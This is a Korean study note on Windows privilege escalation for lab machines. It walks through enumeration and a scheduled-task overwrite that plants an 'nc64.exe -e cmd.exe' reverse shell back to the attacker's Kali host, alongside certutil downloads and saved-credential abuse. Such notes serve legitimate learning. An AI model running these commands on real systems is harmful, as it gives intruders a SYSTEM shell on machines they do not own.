---
slug: "windows-privesc"
title: "windows_privesc"
date: 2026-07-15
category: "미분류"
tags: []
excerpt: "1. `whoami /priv` → 특권 확인 2. `whoami /groups` → 그룹 확인 3. `icacls {파일}` → 파일 권한 확인"
readingTime: 4
---

## 기본 열거 순서
1. `whoami /priv` → 특권 확인
2. `whoami /groups` → 그룹 확인
3. `icacls {파일}` → 파일 권한 확인


뭐 못찾겠을땐 public 계정도 들어가 보셈

# https://lolbas-project.github.io/
**여기서 확인!**

---
## 열거 도구
```cmd
#kali에서 서버 일단 열어둬
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

python3 -m http.server 8000

# winpeas 다운 후 실행
wget {KALI_IP}:8000/winpeas.exe -outfile winpeas.exe
.\winpeas.exe
```
- Writable 스케줄 태스크, 서비스, 레지스트리 자동 탐지

---
## 파일 권한 확인
```cmd
icacls {파일명}
```
권한 의미
- (F) Full Control → 읽기/쓰기/수정/삭제 전부 가능
- (RX) Read + Execute
- (I) 상속된 권한
---
## Writable Scheduled Task 실행 파일
스케줄러가 관리자/SYSTEM 권한으로 실행하는 파일이 수정 가능할 때

확인 방법
```cmd
# 실행 중인 프로세스로 유추
ps "wevtutil"

# 파일 권한 확인
icacls {파일명}
```

익스플로잇
```shell
# 1. Kali에서 nc64.exe 다운 + 서버 열기
wget https://github.com/int0x33/nc.exe/blob/master/nc.exe

python3 -m http.server 8000

nc -lvnp {PORT}

# 2. 타겟 PowerShell에서 nc64.exe 받기 하나씩 해보셔
powershell -c "wget {KALI_IP}:8000/nc64.exe -outfile nc64.exe"
powershell -c "curl http://10.10.14.28:8000/nc64.exe"

# 3. cmd로 전환 후 파일 덮어쓰기
# (PowerShell에서 echo -e 충돌 발생)
cmd
echo C:\{경로}\nc64.exe -e cmd.exe {KALI_IP} {PORT} > {파일명}.bat

# 4. 스케줄러 자동 실행 대기
```

참고
- [[Markup]]: job.bat → BUILTIN\Users:(F) → nc64 리버스쉘 → SYSTEM

---
# Windows Privesc 체크리스트

```
cmdkey /list          # 저장된 크레덴셜 확인
net user <계정>       # Password required: No 확인
runas /savecred 가능 여부 → .lnk 파일에서 힌트 찾기
```
---
# 윈도우 파일 다운로드 (curl,wget 없을 때)

```sh
# kali에서
python3 -m http.server 8000

# 이걸로 파일 다운 가능
certutil -urlcache -split -f http://<IP>/<파일> <저장경로>
```

**참고**
- [[Access]] 
---
# **ADS (Alternate Data Stream) 탐지/읽기

```bash
  dir /A /R          # 숨김파일 + ADS 전부 노출
  more < file:stream:$DATA   # ADS 읽기 (type/cat은 파싱 실패, 반드시 리다이렉션 < 사용)
```
**NTFS ADS의 "스트림"**  
파일 안에 붙어있는 독립된 데이터 덩어리. `hm.txt:root.txt`처럼 하나의 파일이 여러 개의 데이터 창고(스트림)를 가질 수 있음.

-> 숨겨진 flag/데이터는 파일 자체가 아니라 스트림에 있을 수 있다